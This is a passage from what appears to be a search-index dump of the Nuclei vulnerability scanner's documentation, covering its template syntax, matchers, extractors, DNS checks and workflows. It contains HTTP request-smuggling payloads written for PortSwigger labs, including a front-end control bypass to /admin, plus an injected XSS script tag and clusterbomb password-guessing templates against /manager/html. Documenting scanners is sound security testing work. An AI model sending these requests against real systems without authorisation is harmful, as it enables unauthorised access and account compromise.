Accept-Language: en-US,en;q=0.9 matchers : - type : word words : - \"Test is test matcher text\"","title":"Basic template"},{"location":"template-examples/raw/#multiple-raw-request","text":"id : multiple-raw-example info : name : Test RAW Template author : pdteam severity : info requests : - raw : - | GET / HTTP/1.1 Host: {{Hostname}} Origin: {{BaseURL}} Connection: close User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8 Accept-Language: en-US,en;q=0.9 - | POST /testing HTTP/1.1 Host: {{Hostname}} Origin: {{BaseURL}} Connection: close User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8 Accept-Language: en-US,en;q=0.9 testing=parameter matchers : - type : word words : - \"Test is test matcher text\"","title":"Multiple RAW request"},{"location":"template-examples/smuggling/","text":"Basic CL.TE \u00b6 id : CL.TE-http-smuggling info : name : HTTP request smuggling, basic CL.TE vulnerability author : pdteam severity : info lab : https://portswigger.net/web-security/request-smuggling/lab-basic-cl-te requests : - raw : - | POST / HTTP/1.1 Host: {{Hostname}} Connection: keep-alive Content-Type: application/x-www-form-urlencoded Content-Length: 6 Transfer-Encoding: chunked 0 G - | POST / HTTP/1.1 Host: {{Hostname}} Connection: keep-alive Content-Type: application/x-www-form-urlencoded Content-Length: 6 Transfer-Encoding: chunked 0 G unsafe : true matchers : - type : dsl dsl : - 'contains(body, \"Unrecognized method GPOST\")' Basic TE.CL \u00b6 id : TE.CL-http-smuggling info : name : HTTP request smuggling, basic TE.CL vulnerability author : pdteam severity : info lab : https://portswigger.net/web-security/request-smuggling/lab-basic-te-cl requests : - raw : - | POST / HTTP/1.1 Host: {{Hostname}} Content-Type: application/x-www-form-urlencoded Content-length: 4 Transfer-Encoding: chunked 5c GPOST / HTTP/1.1 Content-Type: application/x-www-form-urlencoded Content-Length: 15 x=1 0 - | POST / HTTP/1.1 Host: {{Hostname}} Content-Type: application/x-www-form-urlencoded Content-length: 4 Transfer-Encoding: chunked 5c GPOST / HTTP/1.1 Content-Type: application/x-www-form-urlencoded Content-Length: 15 x=1 0 unsafe : true matchers : - type : dsl dsl : - 'contains(body, \"Unrecognized method GPOST\")' Frontend bypass CL.TE \u00b6 id: smuggling-bypass-front-end-controls-cl-te info: name: HTTP request smuggling to bypass front-end security controls, CL.TE vulnerability author: pdteam severity: info lab: https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-cl-te requests: - raw: - | POST / HTTP/1.1 Host: {{Hostname}} Content-Type: application/x-www-form-urlencoded Content-Length: 116 Transfer-Encoding: chunked 0 GET /admin HTTP/1.1 Host: localhost Content-Type: application/x-www-form-urlencoded Content-Length: 10 x= - | POST / HTTP/1.1 Host: {{Hostname}} Content-Type: application/x-www-form-urlencoded Content-Length: 116 Transfer-Encoding: chunked 0 GET /admin HTTP/1.1 Host: localhost Content-Type: application/x-www-form-urlencoded Content-Length: 10 x= unsafe: true matchers: - type: dsl dsl: - 'contains(body, \"/admin/delete?username=carlos\")' Differential responses based CL.TE \u00b6 id : confirming-cl-te-via-differential-responses-http-smuggling info : name : HTTP request smuggling, confirming a CL.TE vulnerability via differential responses author : pdteam severity : info lab : https://portswigger.net/web-security/request-smuggling/finding/lab-confirming-cl-te-via-differential-responses requests : - raw : - | POST / HTTP/1.1 Host: {{Hostname}} Content-Type: application/x-www-form-urlencoded Content-Length: 35 Transfer-Encoding: chunked 0 GET /404 HTTP/1.1 X-Ignore: X - | POST / HTTP/1.1 Host: {{Hostname}} Content-Type: application/x-www-form-urlencoded Content-Length: 35 Transfer-Encoding: chunked 0 GET /404 HTTP/1.1 X-Ignore: X unsafe : true matchers : - type : dsl dsl : - 'status_code==404' Differential responses based TE.CL \u00b6 id : confirming-te-cl-via-differential-responses-http-smuggling info : name : HTTP request smuggling, confirming a TE.CL vulnerability via differential responses author : pdteam severity : info lab : https://portswigger.net/web-security/request-smuggling/finding/lab-confirming-te-cl-via-differential-responses requests : - raw : - | POST / HTTP/1.1 Host: {{Hostname}} Content-Type: application/x-www-form-urlencoded Content-length: 4 Transfer-Encoding: chunked 5e POST /404 HTTP/1.1 Content-Type: application/x-www-form-urlencoded Content-Length: 15 x=1 0 - | POST / HTTP/1.1 Host: {{Hostname}} Content-Type: application/x-www-form-urlencoded Content-length: 4 Transfer-Encoding: chunked 5e POST /404 HTTP/1.1 Content-Type: application/x-www-form-urlencoded Content-Length: 15 x=1 0 unsafe : true matchers : - type : dsl dsl : - 'status_code==404'","title":"Smuggling"},{"location":"template-examples/smuggling/#basic-clte","text":"id : CL.TE-http-smuggling info : name : HTTP request smuggling, basic CL.TE vulnerability author : pdteam severity : info lab : https://portswigger.net/web-security/request-smuggling/lab-basic-cl-te requests : - raw : - | POST / HTTP/1.1 Host: {{Hostname}} Connection: keep-alive Content-Type: application/x-www-form-urlencoded Content-Length: 6 Transfer-Encoding: chunked 0 G - | POST / HTTP/1.1 Host: {{Hostname}} Connection: keep-alive Content-Type: application/x-www-form-urlencoded Content-Length: 6 Transfer-Encoding: chunked 0 G unsafe : true matchers : - type : dsl dsl : - 'contains(body, \"Unrecognized method GPOST\")'","title":"Basic CL.TE"},{"location":"template-examples/smuggling/#basic-tecl","text":"id : TE.CL-http-smuggling info : name : HTTP request smuggling, basic TE.CL vulnerability author : pdteam severity : info lab : https://portswigger.net/web-security/request-smuggling/lab-basic-te-cl requests : - raw : - | POST / HTTP/1.1 Host: {{Hostname}} Content-Type: application/x-www-form-urlencoded Content-length: 4 Transfer-Encoding: chunked 5c GPOST / HTTP/1.1 Content-Type: application/x-www-form-urlencoded Content-Length: 15 x=1 0 - | POST / HTTP/1.1 Host: {{Hostname}} Content-Type: application/x-www-form-urlencoded Content-length: 4 Transfer-Encoding: chunked 5c GPOST / HTTP/1.1 Content-Type: application/x-www-form-urlencoded Content-Length: 15 x=1 0 unsafe : true matchers : - type : dsl dsl : - 'contains(body, \"Unrecognized method GPOST\")'","title":"Basic TE.CL"},{"location":"template-examples/smuggling/#frontend-bypass-clte","text":"id: smuggling-bypass-front-end-controls-cl-te info: name: HTTP request smuggling to bypass front-end security controls, CL.TE vulnerability author: pdteam severity: info lab: https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-cl-te requests: - raw: - | POST / HTTP/1.1 Host: {{Hostname}} Content-Type: application/x-www-form-urlencoded Content-Length: 116 Transfer-Encoding: chunked 0 GET /admin HTTP/1.1 Host: localhost Content-Type: application/x-www-form-urlencoded Content-Length: 10 x= - | POST / HTTP/1.1 Host: {{Hostname}} Content-Type: application/x-www-form-urlencoded Content-Length: 116 Transfer-Encoding: chunked 0 GET /admin HTTP/1.1 Host: localhost Content-Type: application/x-www-form-urlencoded Content-Length: 10 x= unsafe: true matchers: - type: dsl dsl: - 'contains(body, \"/admin/delete?username=carlos\")'","title":"Frontend bypass CL.TE"},{"location":"template-examples/smuggling/#differential-responses-based-clte","text":"id : confirming-cl-te-via-differential-responses-http-smuggling info : name : HTTP request smuggling, confirming a CL.TE vulnerability via differential responses author : pdteam severity : info lab : https://portswigger.net/web-security/request-smuggling/finding/lab-confirming-cl-te-via-differential-responses requests : - raw : - | POST / HTTP/1.1 Host: {{Hostname}} Content-Type: application/x-www-form-urlencoded Content-Length: 35 Transfer-Encoding: chunked 0 GET /404 HTTP/1.1 X-Ignore: X - | POST / HTTP/1.1 Host: {{Hostname}} Content-Type: application/x-www-form-urlencoded Content-Length: 35 Transfer-Encoding: chunked 0 GET /404 HTTP/1.1 X-Ignore: X unsafe : true matchers : - type : dsl dsl : - 'status_code==404'","title":"Differential responses based CL.TE"},{"location":"template-examples/smuggling/#differential-responses-based-tecl","text":"id : confirming-te-cl-via-differential-responses-http-smuggling info : name : HTTP request smuggling, confirming a TE.CL vulnerability via differential responses author : pdteam severity : info lab : https://portswigger.net/web-security/request-smuggling/finding/lab-confirming-te-cl-via-differential-responses requests : - raw : - | POST / HTTP/1.1 Host: {{Hostname}} Content-Type: application/x-www-form-urlencoded Content-length: 4 Transfer-Encoding: chunked 5e POST /404 HTTP/1.1 Content-Type: application/x-www-form-urlencoded Content-Length: 15 x=1 0 - | POST / HTTP/1.1 Host: {{Hostname}} Content-Type: application/x-www-form-urlencoded Content-length: 4 Transfer-Encoding: chunked 5e POST /404 HTTP/1.1 Content-Type: application/x-www-form-urlencoded Content-Length: 15 x=1 0 unsafe : true matchers : - type : dsl dsl : - 'status_code==404'","title":"Differential responses based TE.CL"},{"location":"template-examples/workflow/","text":"Generic workflows \u00b6 id : workflow-example info : name : Test Workflow Template author : pdteam workflows : - template : /root/jira-detect.yaml - template : /root/confluence-detect.yaml Basic conditional workflows \u00b6 id : springboot-workflow info : name : Springboot Security Checks author : dwisiswant0 workflows : - template : security-misconfiguration/springboot-detect.yaml subtemplates : - template : cves/CVE-2018-1271.yaml - template : cves/CVE-2018-1271.yaml - template : cves/CVE-2020-5410.yaml - template : vulnerabilities/springboot-actuators-jolokia-xxe.yaml - template : vulnerabilities/springboot-h2-db-rce.yaml Multi conditional workflows \u00b6 id : springboot-workflow info : name : Springboot Security Checks author : dwisiswant0 workflows : - template : technologies/tech-detect.yaml matchers : - name : lotus-domino subtemplates : - template : technologies/lotus-domino-version.yaml subtemplates : - template : cves/xx-yy-zz.yaml subtemplates : - template : cves/xx-xx-xx.yaml Conditional workflows with matcher \u00b6 id : workflow-example info : name : Test Workflow Template author : pdteam workflows : - template : technologies/tech-detect.yaml matchers : - name : wordpress subtemplates : - template : cves/CVE-2019-6715.yaml - template : cves/CVE-2019-9978.yaml - template : files/wordpress-db-backup.yaml - template : files/wordpress-debug-log.yaml - template : files/wordpress-directory-listing.yaml - template : files/wordpress-emergency-script.yaml - template : files/wordpress-installer-log.yaml - template : files/wordpress-tmm-db-migrate.yaml - template : files/wordpress-user-enumeration.yaml - template : security-misconfiguration/wordpress-accessible-wpconfig.yaml - template : vulnerabilities/sassy-social-share.yaml - template : vulnerabilities/w3c-total-cache-ssrf.yaml - template : vulnerabilities/wordpress-duplicator-path-traversal.yaml - template : vulnerabilities/wordpress-social-metrics-tracker.yaml - template : vulnerabilities/wordpress-wordfence-xss.yaml - template : vulnerabilities/wordpress-wpcourses-info-disclosure.yaml Multiple Matcher workflow \u00b6 id : workflow-multiple-matcher info : name : Test Workflow Template author : pdteam workflows : - template : technologies/tech-detect.yaml match : - value : vbulletin subtemplates : - template : /root/vbulletin-exp1.yaml - template : /root/vbulletin-exp2.yaml - value : jboss subtemplates : - template : /root/jboss-exp1.yaml - template : /root/jboss-exp2.yaml","title":"Workflow"},{"location":"template-examples/workflow/#generic-workflows","text":"id : workflow-example info : name : Test Workflow Template author : pdteam workflows : - template : /root/jira-detect.yaml - template : /root/confluence-detect.yaml","title":"Generic workflows"},{"location":"template-examples/workflow/#basic-conditional-workflows","text":"id : springboot-workflow info : name : Springboot Security Checks author : dwisiswant0 workflows : - template : security-misconfiguration/springboot-detect.yaml subtemplates : - template : cves/CVE-2018-1271.yaml - template : cves/CVE-2018-1271.yaml - template : cves/CVE-2020-5410.yaml - template : vulnerabilities/springboot-actuators-jolokia-xxe.yaml - template : vulnerabilities/springboot-h2-db-rce.yaml","title":"Basic conditional workflows"},{"location":"template-examples/workflow/#multi-conditional-workflows","text":"id : springboot-workflow info : name : Springboot Security Checks author : dwisiswant0 workflows : - template : technologies/tech-detect.yaml matchers : - name : lotus-domino subtemplates : - template : technologies/lotus-domino-version.yaml subtemplates : - template : cves/xx-yy-zz.yaml subtemplates : - template : cves/xx-xx-xx.yaml","title":"Multi conditional workflows"},{"location":"template-examples/workflow/#conditional-workflows-with-matcher","text":"id : workflow-example info : name : Test Workflow Template author : pdteam workflows : - template : technologies/tech-detect.yaml matchers : - name : wordpress subtemplates : - template : cves/CVE-2019-6715.yaml - template : cves/CVE-2019-9978.yaml - template : files/wordpress-db-backup.yaml - template : files/wordpress-debug-log.yaml - template : files/wordpress-directory-listing.yaml - template : files/wordpress-emergency-script.yaml - template : files/wordpress-installer-log.yaml - template : files/wordpress-tmm-db-migrate.yaml - template : files/wordpress-user-enumeration.yaml - template : security-misconfiguration/wordpress-accessible-wpconfig.yaml - template : vulnerabilities/sassy-social-share.yaml - template : vulnerabilities/w3c-total-cache-ssrf.yaml - template : vulnerabilities/wordpress-duplicator-path-traversal.yaml - template : vulnerabilities/wordpress-social-metrics-tracker.yaml - template : vulnerabilities/wordpress-wordfence-xss.yaml - template : vulnerabilities/wordpress-wpcourses-info-disclosure.yaml","title":"Conditional workflows with matcher"},{"location":"template-examples/workflow/#multiple-matcher-workflow","text":"id : workflow-multiple-matcher info : name : Test Workflow Template author : pdteam workflows : - template : technologies/tech-detect.yaml match : - value : vbulletin subtemplates : - template : /root/vbulletin-exp1.yaml - template : /root/vbulletin-exp2.yaml - value : jboss subtemplates : - template : /root/jboss-exp1.yaml - template : /root/jboss-exp2.yaml","title":"Multiple Matcher workflow"},{"location":"templating-guide/","text":"Templating Guide \u00b6 Nuclei is based on the concepts of YAML based template files that define how the requests will be sent and processed. This allows easy extensibility capabilities to nuclei. The templates are written in YAML which specifies a simple human readable format to quickly define the execution process. Guide to write your own nuclei template - Let's start with the basics and define our own workflow file for detecting the presence of a .git/config file on a webserver and take it from there. Template Details \u00b6 Each template has a unique ID which is used during output writing to specify the template name for an output line. The template file ends with yaml extension. The template files can be created any text editor of your choice. # id contains the unique identifier for the template. id : git-config ID must not contain spaces. This is done to allow easier output parsing. Information \u00b6 Next important piece of information about a template is the info block. Info block provides more context on the purpose of the template and the author . It also contain severity field which indicates the severity of the template, info block supports dynamic fields, so one can define N number of key: value formatted fields to make template information more relevant for the checks you are writing. Let's add an info block to our template as well. info : # Name is the name of the template name : Git Config File Detection Template # Author is the name of the author for the template author : Ice3man # Severity is the severity for the check. severity : medium # Description optionally describes the template. description : Searches for the pattern /.git/config on passed URLs. # CVSS is impact score of the check. cvss : 4.6 Actual requests and corresponding matchers are placed below the info block and they perform the task of making requests to target servers and finding if the template request was successful. Each template file can contain multiple requests to be made. The template is iterated and one by one the desired HTTP/DNS requests are made to the target sites. HTTP Requests \u00b6 Requests start with a request block which specifies the start of the requests for the template. # Start the requests for the template right here requests : Method \u00b6 First thing in the request is method . Request method can be GET , POST , PUT , DELETE , etc depending on the needs. # Method is the method for the request method : GET Redirects \u00b6 Redirection conditions can be specified per each template. By default, redirects are not followed. However, if desired, they can be enabled with redirects: true in request details. 10 redirects are followed at maximum by default which should be good enough for most use cases. More fine grained control can be exercised over number of redirects followed by using max-redirects field. An example of the usage: requests : - method : GET path : - \"{{BaseURL}}/login.php redirects: true max-redirects: 3 Path \u00b6 The next part of the requests is the path of the request path. Dynamic variables can be placed in the path to modify its behavior on runtime. Variables start with {{ and end with }} and are case-sensitive. BaseURL - Placing BaseURL as a variable in the path will lead to it being replaced on runtime in the request by the original URL as specified in the target file. Hostname - Hostname variable is replaced by the hostname of the target on runtime. Some sample dynamic variable replacement examples: path : \"{{BaseURL}}/.git/config\" # This path will be replaced on execution with BaseURL # If BaseURL is set to https://abc.com then the # path will get replaced to the following: https://abc.com/.git/config Multiple paths can also be specified in one request which will be requested for the target. Headers \u00b6 Headers can also be specified to be sent along with the requests. Headers are placed in form of key/value pairs. An example header configuration looks like this: # headers contains the headers for the request headers : # Custom user-agent header User-Agent : Some-Random-User-Agent # Custom request origin Origin : https://google.com Body \u00b6 Body specifies a body to be sent along with the request. For instance: # Body is a string sent along with the request body : \"{\\\"some random JSON\\\"}\" # Body is a string sent along with the request body : \"admin=test\" Session \u00b6 To maintain cookie based browser like session between multiple requests, you can simply use cookie-reuse: true in your template, Useful in cases where you want to maintain session between series of request to complete the exploit chain and to perform authenticated scans. # cookie-reuse accepts boolean input and false as default cookie-reuse : true Matchers \u00b6 Matchers are the core of nuclei. They are what make the tool so powerful. Multiple type of combinations and checks can be added to ensure that the results you get are free from false-positives. Types \u00b6 Multiple matchers can be specified in a request. There are basically 6 types of matchers: Matcher Type Part Matched status Status Code of Response size Content Length of Response word Response body or headers regex Response body or headers binary Response body dsl All Response Parts To match status codes for responses, you can use the following syntax. matchers : # Match the status codes - type : status # Some status codes we want to match status : - 200 - 302 To match binary for hexadecimal responses, you can use the following syntax. matchers : - type : binary binary : - \"504B0304\" # zip archive - \"526172211A070100\" # rar RAR archive version 5.0 - \"FD377A585A0000\" # xz tar.xz archive condition : or part : body To match size, similar structure can be followed. If the status code of response from the site matches any single one specified in the matcher, the request is marked as successful. Word and Regex matchers can be further configured depending on the needs of the users. Complex matchers of type dsl allows to build more elaborated expressions with helper functions, this is an example of a complex DSL matcher: matchers : - type : dsl dsl : - \"len(body)<1024 && status_code==200\" # Body length less than 1024 and 200 status code - \"contains(toupper(body), md5(cookie))\" # Check if the MD5 sum of cookies is contained in the uppercase body Every part of a HTTP response can be matched with DSL matcher: Response Part Description Example content_length Content-Length Header content_length >= 1024 status_code Response Status Code status_code==200 all_headers Unique string containing all headers len(all_headers) body Body as string len(body) header_name Lowercase header name with - converted to _ len(user_agent) raw Headers + Response len(raw) This is the list for a DNS response supported by DSL matcher: Response Part Description Example rcode Response status rcode == \"NXDOMAIN question Response question section len(question) extra Response extra section len(extra) answer Response answers section len(answer) ns Response authority section len(ns) raw Full response len(raw) Conditions \u00b6 Multiple words and regexes can be specified in a single matcher and can be configured with different conditions like AND and OR . AND - Using AND conditions allows matching of all the words from the list of words for the matcher. Only then will the request be marked as successful when all the words have been matched. OR - Using OR conditions allows matching of a single word from the list of matcher. The request will be marked as successful when even one of the word is matched for the matcher. Matched Parts \u00b6 Multiple parts of the response can also be matched for the request, default matched part is body if not defined. Part Matched Part body Body of the response header Header of the response all Both body and header of the response Example matchers for response body using the AND condition: matchers : # Match the body word - type : word # Some words we want to match words : - \"[core]\" - \"[config]\" # Both words must be found in the response body condition : and # We want to match request body (default) part : body Similarly, matchers can be written to match anything that you want to find in the response body allowing unlimited creativity and extensibility. Negative Matchers \u00b6 All types of matchers also support negative/opposite conditions, mostly useful when you looking to match with exclusions, it can be used by adding negative: true in the matchers block. Here is an example syntax using negative condition, this will return all the URLs not having PHPSESSID in the response header. matchers : - type : word words : - \"PHPSESSID\" part : header negative : true In same manner, negative condition can be used with single or multiple matchers. Multiple Matchers \u00b6 Multiple matchers can be used in a single template to fingerprint multiple conditions with a single request. Here is an example of syntax for multiple matchers. matchers : - type : word name : php words : - \"X-Powered-By: PHP\" - \"PHPSESSID\" part : header - type : word name : node words : - \"Server: NodeJS\" - \"X-Powered-By: nodejs\" condition : or part : header - type : word name : python words : - \"Python/2.\" - \"Python/3.\" condition : or part : header Matchers Condition \u00b6 While using multiple matchers the default condition is to follow OR operation in between all the matchers, AND operation can be used to make sure return the result if all matchers returns true. matchers-condition : and matchers : - type : word words : - \"X-Powered-By: PHP\" - \"PHPSESSID\" condition : or part : header - type : word words : - \"PHP\" part : body Extractors \u00b6 Extractors are another important feature of nuclei. Extractors can be used to extract and display in results a match from the response body or headers based on available types. Types \u00b6 Multiple extractors can be specified in a request, as of now we support two type of extractors. Extractor Type Part Matched regex Response body or headers kval Response headers or cookie Example extractor for response body using regex, you can use the following syntax. # A list of extractors for text extraction extractors : # type of the extractor. - type : regex # part of the response to extract (can be headers, all too) part : body # regex to use for extraction. regex : - \"(A3T[A-Z0-9]|AKIA|AGPA|AROA|AIPA|ANPA|ANVA|ASIA)[A-Z0-9]{16}\" To extract key-value formatted data from the header, you can use the following syntax. # A list of extractors for text extraction extractors : # type of the extractor - type : kval part : header kval : # header value to extract from response - content-type To extract key-value formatted data from cookie, you can use the following syntax. # A list of extractors for text extraction extractors : # type of the extractor - type : kval kval : # cookie value to extract from response - PHPSESSID Matched Parts \u00b6 Multiple parts of the response can also be extracted for the request, default matched part is body if not defined. Part Matched Part body Body of the response header Header of the response all Both body and header of the response Note:- kval extractor only supported for header and cookies. Dynamic extractor \u00b6 Extractor plays an important role while writing an template for chained request which requires dynamic value to use at run time, for example CSRF tokens, headers or any values requires to complete the chain. Example of defining extractor as dynamic variable:- extractors : - type : regex name : api_key part : body internal : true regex : - \"(?m)[0-9]{3,10}\\\\.[0-9]+\" Here we used extractor name as variable api_key which holds the value and can be reused in any part of the request dynamically, this feature is supported in RAW request format only. Note:- You can use internal: true when you only want to use extractor as dynamic variable, this will avoid printing extracted values in the terminal. Extraction of regex content can also be specific for matchgroups . # A list of extractors for text extraction extractors : # type of extractor - type : regex # Let's reuse the extracted CSRF token name : csrf_token part : body # group defines the matching group being used. # In GO the \"match\" is the full array of all matches and submatches # match[0] is the full match # match[n] is the submatches. Most often we'd want match[1] as depicted below group : 1 regex : - '<input\\sname=\"csrf_token\"\\stype=\"hidden\"\\svalue=\"([[:alnum:]]{16})\"\\s/>' The above extractor with name csrf_token will hold the value extracted (by ([[:alnum:]]{16})) as abcdefgh12345678 . This is compared to not using the group variable. # A list of extractors for text extraction extractors : # type of extractor - type : regex # Let's reuse the extracted CSRF token name : csrf_html_tag part : body # No group here regex : - '<input\\sname=\"csrf_token\"\\stype=\"hidden\"\\svalue=\"([[:alnum:]]{16})\"\\s/>' The above extractor with name csrf_html_tag will hold the full match (by <input name=\"csrf_token\"\\stype=\"hidden\"\\svalue=\"([[:alnum:]]{16})\" /> ) as <input name=\"csrf_token\" type=\"hidden\" value=\"abcdefgh12345678\" /> . Example HTTP Template \u00b6 The final template file for the .git/config file mentioned above is as follows: id : git-config info : name : Git Config File author : Ice3man severity : medium description : Searches for the pattern /.git/config on passed URLs. requests : - method : GET path : - \"{{BaseURL}}/.git/config\" matchers : - type : word words : - \"[core]\" HTTP Raw requests \u00b6 Another way to create request is using raw requests which comes with more flexibility and support of DSL helper functions, like the following ones (as of now it's suggested to leave the Host header as in the example with the variable {{Hostname}} ), All the Matcher, Extractor capabilities can be used with RAW requests in same the way described above. requests : - raw : - | POST /path2/ HTTP/1.1 Host: {{Hostname}} Content-Length: 1 Origin: https://www.google.com Content-Type: application/x-www-form-urlencoded User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/537.36 (KHTML, like Gecko) Accept-Language: en-US,en;q=0.9 a=test&b=pd Requests can be fine tuned to perform the exact tasks as desired. Nuclei requests are fully configurable meaning you can configure and define each and every single thing about the requests that will be sent to the target servers. Here follows an example: Intruder payloads \u00b6 It's possible to define placeholders with simple keywords (or using brackets {{helper_function(keyword)}} in case mutator functions are needed), and perform Sniper , Pitchfork and ClusterBomb attacks. The wordlist for these attacks needs to be defined during the request definition under the Payload field, with a name matching the keyword, Nuclei supports both file based and in template wordlist support and Finally all DSL functionalities are fully available and supported, and can be used to manipulate the final values. Payloads are defined using variable name and can be referenced in the request between \u00a7 marker, for example \u00a7variable_name\u00a7 . An example of the using payloads with local wordlist: requests : # HTTP Intruder fuzzing using local wordlist. - payloads : parameter : params.txt header : local.txt An example of the using payloads with in template wordlist support: requests : # HTTP Intruder fuzzing using in template wordlist. requests : - payloads : password : - admin - guest - password - test - 12345 - 123456 Note:- be careful while selecting attack type, as unexpected input will break the template. For example, if you used clusterbomb or pitchfork as attack type and defined only one variable in the payload section, template will fail to compile, as clusterbomb or pitchfork expect more then one variable to use in the template. Intruder attack \u00b6 For using intruder, we support multiple attack types, including sniper which generally used to fuzz single parameter, clusterbomb and pitchfork for fuzzing multiple parameters which works same as classical burp intruder on CLI. An example of the using using clusterbomb attack to fuzz. # Defining HTTP Intruder attack type attack : clusterbomb # Available attack types: sniper, pitchfork and clusterbomb RAW HTTP Support \u00b6 Nuclei also supports rawhttp for complete request control and customization allowing any kind of malformed requests checks for issues like HTTP request smuggling, Host header injection, CRLF with malformed characters and more, rawhttp library is disabled as default and can be used by including unsafe: true in the request block. Here is an example for HTTP request smuggling detection using rawhttp . requests : - raw : - | POST / HTTP/1.1 Host: {{Hostname}} Content-Type: application/x-www-form-urlencoded Content-Length: 150 Transfer-Encoding: chunked 0 GET /post?postId=5 HTTP/1.1 User-Agent: a\"/><script>alert(1)</script> Content-Type: application/x-www-form-urlencoded Content-Length: 5 x=1 - | GET /post?postId=5 HTTP/1.1 Host: {{Hostname}} unsafe : true # enables rawhttp client matchers : - type : dsl dsl : - 'contains(body, \"<script>alert(1)</script>\")' Using rawhttp also enable automatic handling of host header and content-length header, to disable this behavior, disable-automatic-content-length-header and disable-automatic-host-header can be used in following manner. requests: - raw: - | POST / HTTP/1.1 Host: {{Hostname}} Content-Type: application/x-www-form-urlencoded Content-Length: 150 Transfer-Encoding: chunked 0 unsafe: true # enables rawhttp client disable-automatic-content-length-header: true disable-automatic-host-header: true matchers: - type: dsl dsl: - 'contains(body, \"<script>alert(1)</script>\")' Helper functions \u00b6 Here is the list of all supported helper functions can be used in the RAW requests: Helper function Description Example len Length of a string len(\"Hello\") toupper String to uppercase toupper(\"Hello\") tolower String to lowercase tolower(\"Hello\") replace Replace string parts replace(\"Hello\", \"He\", \"Ha\") trim Remove trailing unicode chars trim(\"aaaHelloddd\", \"ad\") trimleft Remove unicode chars from left trimleft(\"aaaHelloddd\", \"ad\") trimright Remove unicode chars from right trimleft(\"aaaHelloddd\", \"ad\") trimspace Remove trailing spaces trimspace(\" Hello \") trimprefix Trim specified prefix trimprefix(\"aaHelloaa\", \"aa\") trimsuffix Trim specified suffix trimsuffix(\"aaHelloaa\", \"aa\") base64 Encode string to base64 base64(\"Hello\") base64_decode Decode string from base64 base64_decode(\"SGVsbG8=\") url_encode URL encode a string url_encode(\"hxxps://projectdiscovery.io/test?a=1\") url_decode URL decode a string url_decode(\"https:%2F%2Fprojectdiscovery.io%3Ftest=1\") hex_encode Hex encode a string hex_encode(\"aa\") hex_decode Hex decode a string hex_decode(\"6161\") html_escape Hex encode a string html_escape(\" test \") html_unescape Hex decode a string html_unescape(\"<body>test</body>\") md5 Calculate md5 of string md5(\"Hello\") sha256 Calculate sha256 of string sha256(\"Hello\") sha1 Calculate sha1 of string sha1(\"Hello\") contains Verify if a string contains another one contains(\"Hello\", \"lo\") regex Verify a regex versus a string regex(\"H([a-z]+)o\", \"Hello\") An example of the using helper function in the header. raw : # Request with simple header manipulation with DSL functions - | GET /manager/html HTTP/1.1 Host: {{Hostname}} Authorization: Basic {{base64('username:password')}} User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0 Accept-Language: en-US,en;q=0.9 Connection: close Example RAW Template \u00b6 id : http-raw-request info : name : Example-Fuzzing requests : - payloads : username : - admin password : - admin - guest - password - test - 12345 - 123456 attack : clusterbomb # Supported attack types: sniper, pitchfork and clusterbomb raw : # Request with simple header manipulation with DSL functions - | GET /manager/html HTTP/1.1 Host: {{Hostname}} Authorization: Basic {{base64('username:password')}} User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0 Accept-Language: en-US,en;q=0.9 Connection: close matchers : - type : status status : - 200 DNS Requests \u00b6 Requests start with a dns block which specifies the start of the requests for the template. # Start the requests for the template right here dns : DNS requests can be fine tuned to perform the exact tasks as desired. Nuclei requests are fully configurable meaning you can configure and define each and every single thing about the requests that will be sent to the target servers. Type \u00b6 First thing in the request is type . Request type can be A , NS , CNAME , SOA , PTR , MX , TXT , AAAA . # type is the type for the dns request type : A Name \u00b6 The next part of the requests is the name of the request path. Dynamic variables can be placed in the path to modify its value on runtime. Variables start with {{ and end with }} and are case-sensitive. FQDN - variable is replaced by the hostname/FQDN of the target on runtime. Some sample dynamic variable replacement examples: name : {{ FQDN }} .com # This value will be replaced on execution with the FQDN. # If FQDN is https://this.is.an.example then the # name will get replaced to the following: this.is.an.example.com As of now the tool supports only one question per request. Class \u00b6 Class type can be INET , CSNET , CHAOS , HESIOD , NONE and ANY . Usually it's enough to just leave it as INET . # method is the class for the dns request class : inet Recursion \u00b6 Recursion is a boolean value, and determines if the resolver should only return cached results, or traverse the whole dns root tree to retrieve fresh results. Generally it's better to leave it as true . # Recursion is a boolean determining if the request is recursive recursion : true Retries \u00b6 Retries is the number of attempts a dns query is retried before giving up among different resolvers. It's recommended a reasonable value, like 3 . # Retries is a number of retries before giving up on dns resolution retries : 3 Matchers \u00b6 Matchers are just equal to HTTP, but the search is performed on the whole dns response, therefore it's not necessary to specify the part . Multiple type of combinations and checks can be added to ensure that the results you get are free from false positives. The complex dsl matcher type allows to build complex queries as described in the HTTP section. Types \u00b6 Multiple matchers can be specified in a request. There are basically 3 types of matchers: Matcher Type Part Matched word DNS Response regex DNS Response dsl DNS Response Example DNS Template \u00b6 The final example template file for performing A query, and check if CNAME and A records are in the response is as follows: id : dummy-cname-a info : name : Dummy A dns request author : mzack9999 severity : none description : Checks if CNAME and A record is returned. dns : - name : \"{{FQDN}}\" type : A class : inet recursion : true retries : 3 matchers : - type : word words : # The response must contains a CNAME record - \"IN\\tCNAME\" # and also at least 1 A record - \"IN\\tA\" condition : and Workflows \u00b6 Workflows are powerful utility of nuclei and most efficient way to use nuclei templates where all the templates can be configured based on specific needs of users, one can configure a workflow in a way that ensures / control complete nuclei templates checks from a single workflow, the use cases varies depending upon the users needs. Tengo , a scripting engine is used as a base for nuclei workflows which provides a very powerful and highly customizable engine for users to automate all their needs. Workflows can be defined with workflows attribute, following the template or subtemplates to executes, and we can write two type of workflows. # Workflows starts form this block. workflows : - template : technologies/template-to-execute.yaml Type of workflows Generic workflows Conditional workflows Generic Workflows \u00b6 In generic workflow one can define a single or multiple template executions from a single workflow, it can be list of specific templates or list of directory containing multiple templates. For example:- # A workflow that runs all config related templates 